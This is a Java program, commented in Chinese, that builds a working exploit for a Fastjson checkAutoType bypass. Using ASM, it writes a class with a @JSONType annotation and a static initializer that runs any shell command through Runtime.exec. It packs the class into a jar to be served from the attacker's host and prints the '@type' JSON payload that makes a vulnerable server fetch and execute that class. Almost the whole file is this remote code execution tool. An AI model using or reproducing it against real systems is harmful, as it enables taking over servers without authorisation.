import org.objectweb.asm.*;
import java.io.*;
import java.nio.file.*;
import java.util.jar.*;

/**
 * 生成恶意 probe.jar
 *
 * 原理: Fastjson checkAutoType 中 @JSONType 探测路径执行:
 *   typeName.replace('.', '/') + ".class" → getResourceAsStream()
 *
 * payload "@type":"jar:http:..INT_IP:PORT.probe!.POC"
 * 经 replace 后: "jar:http://IP:PORT/probe!/POC.class"
 * LaunchedURLClassLoader 远程加载 → <clinit> 执行
 */
public class GenProbe {
    public static void main(String[] args) throws Exception {
        String lhost = args.length > 0 ? args[0] : "127.0.0.1";
        String lport = args.length > 1 ? args[1] : "19090";
        String cmd = args.length > 2 ? args[2] : "open -a Calculator";

        // IP 转整数
        String[] parts = lhost.split("\\.");
        long ipInt = (Long.parseLong(parts[0]) << 24) | (Long.parseLong(parts[1]) << 16)
                   | (Long.parseLong(parts[2]) << 8) | Long.parseLong(parts[3]);

        String internalName = "jar:http://" + ipInt + ":" + lport + "/probe!/POC";

        ClassWriter cw = new ClassWriter(ClassWriter.COMPUTE_MAXS);
        cw.visit(Opcodes.V1_8, Opcodes.ACC_PUBLIC, internalName, null, "java/lang/Object", null);

        // @JSONType 注解 — 触发 Fastjson 信任路径
        cw.visitAnnotation("Lcom/alibaba/fastjson/annotation/JSONType;", true).visitEnd();

        // 构造函数
        MethodVisitor init = cw.visitMethod(Opcodes.ACC_PUBLIC, "<init>", "()V", null, null);
        init.visitCode();
        init.visitVarInsn(Opcodes.ALOAD, 0);
        init.visitMethodInsn(Opcodes.INVOKESPECIAL, "java/lang/Object", "<init>", "()V", false);
        init.visitInsn(Opcodes.RETURN);
        init.visitMaxs(1, 1);
        init.visitEnd();

        // static {} — 执行命令
        MethodVisitor clinit = cw.visitMethod(Opcodes.ACC_STATIC, "<clinit>", "()V", null, null);
        clinit.visitCode();
        clinit.visitMethodInsn(Opcodes.INVOKESTATIC, "java/lang/Runtime", "getRuntime", "()Ljava/lang/Runtime;", false);
        clinit.visitInsn(Opcodes.ICONST_3);
        clinit.visitTypeInsn(Opcodes.ANEWARRAY, "java/lang/String");
        clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_0);
        clinit.visitLdcInsn("/bin/bash"); clinit.visitInsn(Opcodes.AASTORE);
        clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_1);
        clinit.visitLdcInsn("-c"); clinit.visitInsn(Opcodes.AASTORE);
        clinit.visitInsn(Opcodes.DUP); clinit.visitInsn(Opcodes.ICONST_2);
        clinit.visitLdcInsn(cmd); clinit.visitInsn(Opcodes.AASTORE);
        clinit.visitMethodInsn(Opcodes.INVOKEVIRTUAL, "java/lang/Runtime", "exec", "([Ljava/lang/String;)Ljava/lang/Process;", false);
        clinit.visitInsn(Opcodes.POP);
        clinit.visitInsn(Opcodes.RETURN);
        clinit.visitMaxs(5, 0);
        clinit.visitEnd();

        cw.visitEnd();

        // 打包
        Files.createDirectories(Paths.get("poc/www"));
        Path jarPath = Paths.get("poc/probe.jar");
        try (JarOutputStream jos = new JarOutputStream(new FileOutputStream(jarPath.toFile()))) {
            jos.putNextEntry(new JarEntry("POC.class"));
            jos.write(cw.toByteArray());
            jos.closeEntry();
        }
        Files.copy(jarPath, Paths.get("poc/www/probe"), StandardCopyOption.REPLACE_EXISTING);

        System.out.println("[+] poc/probe.jar & poc/www/probe generated");
        System.out.println("[+] Payload: {\"@type\":\"jar:http:.." + ipInt + ":" + lport + ".probe!.POC\",\"x\":1}");
    }
}
